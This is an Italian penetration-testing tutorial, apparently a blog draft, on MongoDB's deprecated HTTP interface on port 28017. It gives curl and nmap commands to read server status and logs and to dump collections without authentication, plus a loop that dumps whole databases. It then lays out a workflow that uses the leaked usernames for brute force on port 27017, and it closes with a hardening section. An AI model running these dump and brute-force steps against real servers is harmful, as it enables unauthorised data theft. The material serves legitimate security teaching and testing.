---
title: 'Porta 28017 MongoDB HTTP: Information Disclosure e REST API Senza Auth'
slug: porta-28017-mongodb-http
description: 'Porta 28017 aperta? Leggi versione, hostname e log senza credenziali, dumpa dati via REST API e pivota sulla 27017. Solo su MongoDB legacy ≤ 3.4, spesso non patchato.'
image: /porta-28017-mongodb-http.webp
draft: true
date: 2026-04-21T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - ' information-disclosure'
  - recon
  - mongodb
---

La porta 28017 ospita l'interfaccia HTTP diagnostica di MongoDB — una web UI leggera che mostra lo stato del server, le connessioni attive, i log e, nelle configurazioni con REST API abilitata, permette di eseguire query via browser. È stata **deprecata in MongoDB 3.2** (2015) e **rimossa in MongoDB 3.6** (2017), ma nel pentest si trova ancora su server con versioni datate, su installazioni legacy mai aggiornate o su fork MongoDB-compatibili che l'hanno mantenuta.

Trovarla aperta è un finding doppiamente critico: primo, espone informazioni sensibili sull'infrastruttura MongoDB (versione, hostname, connessioni, log); secondo, la sua presenza conferma che il server usa una versione MongoDB vecchia e probabilmente non patchata — ampliando la superficie di attacco sulla [porta 27017](https://hackita.it/articoli/porta-27017-mongodb) principale.

## Come Funzionava

L'interfaccia HTTP di MongoDB si abilitava nel file di configurazione:

```yaml
# mongod.conf (versioni < 3.6)
net:
  http:
    enabled: true
    RESTInterfaceEnabled: true   # opzionale: abilita query via REST
```

Oppure da command line:

```bash
mongod --httpinterface --rest
```

La web UI ascoltava su **porta 27017 + 1000 = 28017**. Se MongoDB girava sulla porta custom 30000, la HTTP interface era sulla 31000.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 28017 10.10.10.40
```

```
PORT      STATE SERVICE VERSION
28017/tcp open  http    MongoDB http console
```

### Accesso via browser o curl

```bash
curl -s http://10.10.10.40:28017/
```

```html
<html>
<head><title>mongod</title></head>
<body>
<h2>mongod -- db version v3.4.24</h2>
<p>
  host: mongo-prod-01<br>
  port: 27017<br>
  uptime: 145 days<br>
  pid: 1234<br>
</p>
...
```

**Intelligence immediata dalla homepage:**

* **Versione esatta**: MongoDB 3.4.24 — vecchia, cerca CVE su [Exploit-DB](https://hackita.it/articoli/exploit-db)
* **Hostname**: `mongo-prod-01` — hostname interno del server
* **Uptime**: 145 giorni — probabilmente non patchato da quasi 5 mesi
* **Porta**: conferma che la 27017 è attiva

### Pagine diagnostiche

La HTTP interface espone diverse pagine senza autenticazione:

**Server status:**

```bash
curl -s http://10.10.10.40:28017/_status
```

```json
{
  "host": "mongo-prod-01",
  "version": "3.4.24",
  "process": "mongod",
  "pid": 1234,
  "uptime": 12528000,
  "connections": {
    "current": 45,
    "available": 819,
    "totalCreated": 123456
  },
  "opcounters": {
    "insert": 5678901,
    "query": 12345678,
    "update": 2345678,
    "delete": 123456
  },
  "mem": {
    "resident": 4096,
    "virtual": 8192,
    "mapped": 2048
  }
}
```

Statistiche dettagliate: connessioni attive (45 client connessi), operazioni totali, memoria usata.

**Connessioni attive:**

```bash
curl -s http://10.10.10.40:28017/_commands
```

**Log del server:**

```bash
curl -s http://10.10.10.40:28017/_log
```

I log MongoDB possono contenere query con parametri, errori di autenticazione con username, connessioni con IP sorgente e in casi estremi, query con dati sensibili loggati.

**Replica set status:**

```bash
curl -s http://10.10.10.40:28017/replSetGetStatus
```

Se il server fa parte di un [replica set](https://hackita.it/articoli/porta-27018-mongodb-cluster), mostra tutti i membri con hostname e stato — mappa del cluster.

## 2. REST API — Query via HTTP

Se `RESTInterfaceEnabled` era abilitato, puoi eseguire query MongoDB direttamente via URL:

### Lista database

```bash
curl -s http://10.10.10.40:28017/admin/
```

### Leggi una collection

```bash
curl -s http://10.10.10.40:28017/production/users/
```

```json
{
  "offset": 0,
  "rows": [
    {
      "_id": {"$oid": "65a5b1234567890abcdef12"},
      "username": "admin",
      "email": "admin@corp.local",
      "password": "$2b$10$abcdefghijklmnopqrstuvwx",
      "role": "administrator"
    },
    {
      "_id": {"$oid": "65a5b1234567890abcdef13"},
      "username": "j.smith",
      "email": "j.smith@corp.local",
      "password": "$2b$10$zyxwvutsrqponmlkjihgfed",
      "role": "user"
    }
  ],
  "total_rows": 15234,
  "query": {}
}
```

Accesso diretto ai dati via browser. Hash password, email, ruoli — tutto esposto senza autenticazione, leggibile da un semplice `curl`.

### Query con filtri

```bash
# Filtra per ruolo admin
curl -s "http://10.10.10.40:28017/production/users/?filter_role=administrator"
```

```bash
# Cerca un utente specifico
curl -s "http://10.10.10.40:28017/production/users/?filter_username=admin"
```

### Iterare tutte le collection

```bash
# Script per dump completo via REST
for db in admin production staging; do
    echo "=== DATABASE: $db ==="
    curl -s "http://10.10.10.40:28017/$db/" | python3 -m json.tool 2>/dev/null
done
```

Per l'exfiltration completa dei dati, `mongodump` sulla [porta 27017](https://hackita.it/articoli/porta-27017-mongodb) è più efficiente e strutturato, ma la REST API sulla 28017 funziona quando la 27017 è protetta da firewall e la 28017 no — scenario che accade quando l'admin dimentica che la HTTP interface esiste.

## 3. Information Disclosure → Attacco alla 27017

La 28017 è principalmente un canale di intelligence. Le informazioni ottenute guidano l'attacco alla [porta 27017](https://hackita.it/articoli/porta-27017-mongodb):

| Info dalla 28017        | Utilizzo                                                                                       |
| ----------------------- | ---------------------------------------------------------------------------------------------- |
| Versione MongoDB        | Cerca CVE specifiche per la versione                                                           |
| Hostname interno        | DNS interno, risolvi per trovare altri servizi                                                 |
| Nodi replica set        | Target aggiuntivi sulle [porte 27018](https://hackita.it/articoli/porta-27018-mongodb-cluster) |
| Connessioni attive (IP) | Client che si connettono → server applicativi da attaccare                                     |
| Uptime lungo            | Server non patchato → più vulnerabilità                                                        |
| Log con username        | Username validi per brute force sulla 27017                                                    |
| Dati via REST           | Dump diretto se REST è abilitata                                                               |

### Workflow tipico

```
1. Trovi la 28017 aperta → raccogli intelligence
2. Versione 3.4.x → cerca CVE, è una versione end-of-life
3. Hostname "mongo-prod-01.corp.internal" → scopri la rete interna
4. Replica set con 3 nodi → scansiona le porte 27018 dei secondary
5. Log mostrano username "appuser" → brute force sulla 27017
6. REST API attiva → dump dati direttamente via HTTP
```

## 4. CVE e Versioni Vulnerabili

Se la 28017 è presente, il server è MongoDB ≤ 3.4 (o al massimo 3.6 senza la rimozione). Queste versioni hanno CVE note:

```bash
searchsploit mongodb
```

| CVE           | Versione  | Impatto                 |
| ------------- | --------- | ----------------------- |
| CVE-2017-2665 | \< 3.4.10 | Auth bypass in mongos   |
| CVE-2016-6494 | \< 3.2.10 | Information disclosure  |
| CVE-2015-7882 | \< 3.0.7  | Auth bypass             |
| CVE-2013-1892 | \< 2.4.4  | Code injection via BSON |

Versioni pre-3.6 sono tutte end-of-life e non ricevono patch di sicurezza dal 2021.

## 5. Detection & Hardening

### La fix è semplice: la 28017 non dovrebbe esistere

**Se MongoDB \< 3.6:**

```yaml
# mongod.conf — disabilita l'interfaccia HTTP
net:
  http:
    enabled: false
    RESTInterfaceEnabled: false
```

**Se MongoDB ≥ 3.6:** l'interfaccia HTTP non esiste più. Se trovi la 28017 aperta su una versione ≥ 3.6, è un altro servizio sulla stessa porta — indaga.

**Azione corretta:** aggiorna a una versione MongoDB supportata (6.0+ nel 2026). Le versioni con HTTP interface sono tutte end-of-life.

### Mitigazione temporanea

* **Firewall** — blocca la 28017 da qualsiasi IP esterno
* **Disabilita `--httpinterface` e `--rest`** nei parametri di avvio
* **Verifica con nmap** dopo la modifica che la porta sia effettivamente chiusa

## 6. Cheat Sheet Finale

| Azione                | Comando                                                    |
| --------------------- | ---------------------------------------------------------- |
| Nmap                  | `nmap -sV -p 28017 target`                                 |
| Homepage              | `curl -s http://target:28017/`                             |
| Server status         | `curl -s http://target:28017/_status`                      |
| Log                   | `curl -s http://target:28017/_log`                         |
| Replica set info      | `curl -s http://target:28017/replSetGetStatus`             |
| REST: lista DB        | `curl -s http://target:28017/admin/`                       |
| REST: dump collection | `curl -s http://target:28017/DATABASE/COLLECTION/`         |
| REST: filtra          | `curl -s "http://target:28017/DB/COL/?filter_FIELD=VALUE"` |
| Searchsploit          | `searchsploit mongodb`                                     |

***

Riferimento: MongoDB documentation (legacy HTTP interface), MongoDB Security Checklist, HackTricks MongoDB. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
